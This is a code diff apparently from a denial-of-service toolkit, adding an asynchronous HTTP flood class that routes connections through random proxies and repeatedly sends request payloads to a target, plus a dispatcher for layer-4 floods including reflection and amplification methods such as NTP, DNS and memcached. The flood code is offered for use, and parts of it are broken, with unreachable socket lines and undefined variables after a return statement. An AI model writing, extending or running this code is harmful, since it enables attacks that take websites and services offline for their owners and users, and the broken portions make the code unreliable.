@@ -1,3 +1,6 @@
+import asyncio
+import aiosocks
+
 import logging
 from contextlib import suppress
 from itertools import cycle
@@ -893,6 +896,89 @@ class HttpFlood:
         if name == "EVEN": self.SENT_FLOOD = self.EVEN
         if name == "DOWNLOADER": self.SENT_FLOOD = self.DOWNLOADER
 
+
+class AsyncHttpFlood(HttpFlood):
+
+    async def run(self) -> int:
+        return await self.SENT_FLOOD()
+
+    # XXX: socket flags
+    # XXX: timeout
+    async def open_connection(self) -> socket:
+        is_tls = self._target.scheme.lower() == "https" or self._target.port == 443
+        if self._proxies:
+            proxy = randchoice(self._proxies)
+            reader, writer = await aiosocks.open_connection(
+                proxy=proxy,
+                proxy_auth=None,
+                dst=self._raw_target,
+                remote_resolve=False,
+                ssl=ctx if is_tls else None
+            )
+        else:
+            reader, writer = await asyncio.open_connection(
+                host=self._target.host, port=self._target.port, ssl=is_tls) 
+        return reader, writer
+
+        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+        sock.settimeout(SOCK_TIMEOUT)
+        sock.connect(self._raw_target)
+
+        return sock
+
+    async def GET(self) -> int:
+        payload: bytes = self.generate_payload()
+        writer, packets = None, 0
+        try:
+            reader, writer = await self.open_connection()
+            for _ in range(self._rpc):
+                writer.write(payload)
+                await writer.drain()
+                self._stats.track(1, len(payload))
+                packets += 1
+        except Exception as e:
+            pass
+            #print(e)
+        if writer:
+            writer.close()
+            await writer.wait_closed()
+        return packets
+
+
+def async_main(url, ip, method, event, proxies, stats, rpc=None, refl_li_fn=None):
+    if method not in Methods.ALL_METHODS:
+        exit(f"Method {method} Not Found")
+
+    (url, ip), proxies = Tools.parse_params(url, ip, proxies)
+    if method in Methods.LAYER7_METHODS:
+        return AsyncHttpFlood(url, ip, method, rpc, event, USERAGENTS, REFERERS, proxies, stats)
+
+    if method in Methods.LAYER4_METHODS:
+        port = url.port
+
+        if port > 65535 or port < 1:
+            exit("Invalid Port [Min: 1 / Max: 65535] ")
+
+        if not port:
+            logger.warning("Port Not Selected, Set To Default: 80")
+            port = 80
+
+        ref = None
+        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
+            # TODO: rework this code when amplifier attack is planned
+            # (not used as of now)
+            refl_li = ROOT_DIR / "files" / refl_li_fn
+            if not refl_li.exists():
+                exit("The reflector file doesn't exist")
+            with refl_li.open("r+") as f:
+                ref = set(
+                    a.strip()
+                    for a in ProxyTools.Patterns.IP.findall(f.read())
+                )
+            if not ref:
+                exit("Empty Reflector File ")
+
+        return Layer4((ip, port), ref, method, event, proxies, stats)
 
 def main(url, ip, method, event, proxies, stats, rpc=None, refl_li_fn=None):
     if method not in Methods.ALL_METHODS:
